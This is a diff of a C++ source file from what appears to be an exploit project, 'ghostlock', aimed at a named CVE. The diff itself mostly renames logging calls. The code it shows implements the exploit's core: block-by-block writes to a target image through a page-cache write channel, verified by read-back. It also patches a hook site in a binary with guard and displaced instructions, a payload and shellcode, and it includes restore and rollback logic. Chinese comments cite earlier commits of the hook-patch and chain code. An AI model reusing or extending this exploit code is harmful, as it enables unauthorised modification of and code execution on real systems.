@@ -1,7 +1,7 @@
 /** @file backend/cve_2026_43284/steps/pagecache_steps.cpp
  *  The block loop every image write shares. See the header for the boundary.
  */
-#include "jni/gl_log.hpp"
+#include "support/gl_log.h"
 #include <chrono>
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
 
@@ -94,7 +94,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         request.params->offset = block_at;
         request.params->offset_set = true;
         std::byte block[64] = {};
-        GL_LOGI("hook: read site block at=%llu width=%zu channel=%d offset_set=%d",
+        verbose("hook: read site block at=%llu width=%zu channel=%d offset_set=%d",
                 static_cast<unsigned long long>(block_at), request.width,
                 static_cast<int>(request.channel), request.params->offset_set ? 1 : 0);
         const auto before = request.access->read(0U, request.width, request.channel, *request.params);
@@ -110,7 +110,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             (void) std::snprintf(site_hex + (i * 3U), 4U, "%02x ",
                             static_cast<unsigned>(std::to_integer<std::uint8_t>(block[i])));
         }
-        GL_LOGI("hook: site bytes %s", site_hex);
+        debug("hook: site bytes %s", site_hex);
         const auto word_at = [&](std::size_t at) noexcept {
             return static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at])) |
                    (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 1U])) << 8U) |
@@ -138,17 +138,17 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             site_ascii[i] = (byte >= 0x20U && byte < 0x7FU) ? static_cast<char>(byte) : '.';
         }
         site_ascii[16] = '\0';
-        GL_LOGI("hook slot: entry off=0x%zx len=4 payload_file=0x%llx",
+        verbose("hook slot: entry off=0x%zx len=4 payload_file=0x%llx",
                 plan.entry_offset,
                 static_cast<unsigned long long>(plan.payload_file_offset + plan.entry_offset));
-        GL_LOGI("hook slot: displaced off=0x%zx len=4 word=0x%08x ascii=%s",
+        verbose("hook slot: displaced off=0x%zx len=4 word=0x%08x ascii=%s",
                 plan.displaced_offset, static_cast<unsigned>(plan.displaced_instruction), displaced_ascii);
-        GL_LOGI("hook slot: jump_back off=0x%zx len=4 vaddr=0x%llx",
+        verbose("hook slot: jump_back off=0x%zx len=4 vaddr=0x%llx",
                 plan.jump_back_offset,
                 static_cast<unsigned long long>(plan.payload_vaddr + plan.jump_back_offset));
-        GL_LOGI("hook site: off=0x%llx within=%zu len=%zu ascii=%s",
+        verbose("hook site: off=0x%llx within=%zu len=%zu ascii=%s",
                 static_cast<unsigned long long>(plan.hook_file_offset), within, request.width, site_ascii);
-        GL_LOGI("hook site before: guard=0x%08x displaced=0x%08x branch=0x%08x ascii=%s",
+        debug("hook site before: guard=0x%08x displaced=0x%08x branch=0x%08x ascii=%s",
                 static_cast<unsigned>(word_at(within - 4U)), static_cast<unsigned>(word_at(within)),
                 static_cast<unsigned>(branch), branch_ascii);
         if (word_at(within - 4U) != plan.guard_instruction) {
@@ -171,7 +171,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             *refusal = kPayloadNotBuilt;
             return false;
         }
-        GL_LOGI("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
+        verbose("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
                 static_cast<unsigned long long>(plan.payload_file_offset), payload_size, request.width,
                 static_cast<unsigned long long>(plan.payload_max_bytes), plan.entry_offset);
         WriteRequest body{};
@@ -206,7 +206,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         const auto after = request.access->read(0U, request.width, request.channel, *request.params);
         /* 站点写回后的读数（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:147-153
          *  —— 那边先存原文再写包裹站点的那一整块；这里把写后回读的结果原样打出来）。 */
-        GL_LOGI("hook site writeback: wrote=%zu/%zu off=0x%llx branch=0x%08x readback_ok=%d readback_same=%d",
+        debug("hook site writeback: wrote=%zu/%zu off=0x%llx branch=0x%08x readback_ok=%d readback_same=%d",
                 wrote.value, request.width, static_cast<unsigned long long>(block_at),
                 static_cast<unsigned>(branch), after.ok() ? 1 : 0,
                 (after.ok() && after.value.size() == request.width &&
@@ -251,7 +251,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         /* 还原段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:210-225
          *  —— restore_hook_patch 先整块写回 trampoline_orig（站点字就在这一块里），再写 shellcode 的原文块。
          *  这里做同一件事的最小步：只把站点所在块的两字按计划写回，先 guard、再 displaced）。 */
-        GL_LOGI("restore: site block off=0x%llx within=%zu guard=0x%08x displaced=0x%08x",
+        debug("restore: site block off=0x%llx within=%zu guard=0x%08x displaced=0x%08x",
                 static_cast<unsigned long long>(block_at), within,
                 static_cast<unsigned>(plan.guard_instruction),
                 static_cast<unsigned>(plan.displaced_instruction));
@@ -287,7 +287,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 break;
             }
         }
-        GL_LOGI("restore writeback: off=0x%llx width=%zu attempts=%zu readback_same=%d",
+        verbose("restore writeback: off=0x%llx width=%zu attempts=%zu readback_same=%d",
                 static_cast<unsigned long long>(block_at), request.width, attempt, same ? 1 : 0);
         if (!same) {
             *refusal = kRestoreVerifyFailed;
@@ -427,12 +427,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 } else {
                     outcome.rollback_incomplete = true;
                 }
-                GL_LOGI("rollback block[%zu]: off=%llu restored=%d rolled=%zu incomplete=%d",
+                verbose("rollback block[%zu]: off=%llu restored=%d rolled=%zu incomplete=%d",
                         block, static_cast<unsigned long long>(at), restored ? 1 : 0, rolled,
                         outcome.rollback_incomplete ? 1 : 0);
             }
             outcome.blocks_rolled_back = rolled;
-            GL_LOGI("rollback: from=%zu to=0 rolled=%zu incomplete=%d",
+            debug("rollback: from=%zu to=0 rolled=%zu incomplete=%d",
                     journal.count == 0U ? 0U : journal.count - 1U, rolled,
                     outcome.rollback_incomplete ? 1 : 0);
         }
@@ -472,7 +472,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             *refusal = reason;
             request.failed_block = block;
             rollback_journal(request, journal, ledger);
-            GL_LOGI("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
+            debug("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
             if (outcome_out != nullptr) { *outcome_out = ledger; }
             return false;
         };
@@ -495,7 +495,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
              *  —— 那边逐块：offset = region.offset + b*16、长度 = kChainBlockBytes、写 16 字节；
              *  patch #1 的同款循环在 steps/crash_dump.cpp:40-50；
              *  同一块的来源 fd 由窗口层报（pagecache_write.hpp 的 write_block enter fd=…））。 */
-            GL_LOGI("image block[%zu/%zu]: off=%llu len=%zu take=%zu",
+            verbose("image block[%zu/%zu]: off=%llu len=%zu take=%zu",
                     block, blocks, static_cast<unsigned long long>(request.offset + at), request.width, take);
             /* journal：**写之前**先把旧块记下来。走的就是本单元既有的回读路径（access->read，
              * 与校验读同一个面、同一个宽度、同一份 offset 语义），不另开一条读法。
@@ -530,7 +530,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             }
             ++ledger.written;
             if ((at % kLogEveryBytes) == 0U) {
-                GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
+                verbose("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
                         static_cast<unsigned long long>(request.offset + at),
                         static_cast<unsigned long long>(request.budget_ms));
             }
@@ -539,7 +539,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                  * fork+exec）。判据没有放宽 —— 抽样间隔是调用方给的判据，任何一次真做了的回读不符
                  * 仍然整段失败。 */
                 if ((at % kLogEveryBytes) == 0U) {
-                    GL_LOGI("block[%zu]: written, not read back (verify_every=%zu)", at, request.verify_every);
+                    verbose("block[%zu]: written, not read back (verify_every=%zu)", at, request.verify_every);
                 }
                 after_failure = false;
                 continue;
@@ -559,7 +559,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                     request.params->offset_set = true;
                     const auto again = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                              request.channel, *request.params);
-                    GL_LOGI("block[%zu] try=%zu resent=%zu/%zu", at, tries, again.value, request.width);
+                    verbose("block[%zu] try=%zu resent=%zu/%zu", at, tries, again.value, request.width);
                 }
             const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                 /* 回读结果本身（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:252-262
@@ -569,7 +569,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 /* 与参照实现同粒度：每 512 字节一行（= 宽 16 时每 32 块）；**不符的那一次逐块打印**，
                  * 抽样只决定读不读，不决定失败行打不打。 */
                 if (!matches || (at % kLogEveryBytes) == 0U) {
-                GL_LOGI("image block[%zu] readback: off=%llu len=%zu ok=%d size=%zu same=%d head=%02x%02x%02x%02x",
+                verbose("image block[%zu] readback: off=%llu len=%zu ok=%d size=%zu same=%d head=%02x%02x%02x%02x",
                         at, static_cast<unsigned long long>(request.offset + at), request.width,
                         back.ok() ? 1 : 0, back.value.size(), matches ? 1 : 0,
                         back.ok() && back.value.size() > 0U
@@ -587,7 +587,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                      * burns the whole budget, which is what turns a five second chain into minutes. */
                     const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
                         std::chrono::steady_clock::now() - block_start).count();
-                    GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
+                    verbose("block[%zu]: landed tries=%zu took=%lld us", at, tries,
                             static_cast<long long>(block_us));
                     /* 这一块重发过 ⇒ 通道刚才没通过 ⇒ 下一块一定回读（verify_this_block 的第二条）。 */
                     after_failure = tries > 1U;
@@ -598,14 +598,14 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                     const unsigned char *want = reinterpret_cast<const unsigned char *>(in);
                     const unsigned char *got = back.ok() ? reinterpret_cast<const unsigned char *>(back.value.data()) : nullptr;
                     if (got != nullptr && back.value.size() == request.width) {
-                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got %02x%02x%02x%02x", at,
+                        verbose("block[%zu] verify failed: want %02x%02x%02x%02x got %02x%02x%02x%02x", at,
                                 want[0], want[1], want[2], want[3], got[0], got[1], got[2], got[3]);
                     } else {
-                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got unreadable (ok=%d size=%zu)", at,
+                        verbose("block[%zu] verify failed: want %02x%02x%02x%02x got unreadable (ok=%d size=%zu)", at,
                                 want[0], want[1], want[2], want[3], back.ok() ? 1 : 0, back.value.size());
                     }
                     /* 首个不符块是哪一块、试了几次 —— 与同一跑的 block[…] landed 行对齐即可判明是写没到还是读不到。 */
-            GL_LOGI("verify failed: block_at=%zu offset=%llu tries=%zu", at,
+            error("verify failed: block_at=%zu offset=%llu tries=%zu", at,
                     static_cast<unsigned long long>(request.offset + at), tries);
             /*
              * 判定分叉：写报成功而目标偏移不变时，扫邻近偏移。
@@ -616,20 +616,20 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 request.params->offset_set = true;
                 const auto scan = request.access->read(0U, request.width, request.channel, *request.params);
                 const bool ok = scan.ok() && scan.value.size() >= 2U;
-                GL_LOGI("verify scan: off=%llu head=%02x%02x",
+                debug("verify scan: off=%llu head=%02x%02x",
                         static_cast<unsigned long long>(request.offset + scan_at),
                         ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[0])) : 0U,
                         ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[1])) : 0U);
             }
                     /* budget-exhausted：预算用尽仍不中 ⇒ 整段失败，已记的旧块逆序写回。 */
-                    GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
+                    verbose("block[%zu]: budget exhausted after %zu tries", at, tries);
                     return fail(kVerifyFailed, block);
                 }
                 ::usleep(2000);  /* 一个轮询间隔（2 ms） */
             }
         }
         /* 成功路径的账：n 条旧块留在 journal 里，一条都没有写回（rolled_back 保持 0）。 */
-        GL_LOGI("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
+        debug("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
         if (outcome_out != nullptr) { *outcome_out = ledger; }
         return true;
     }
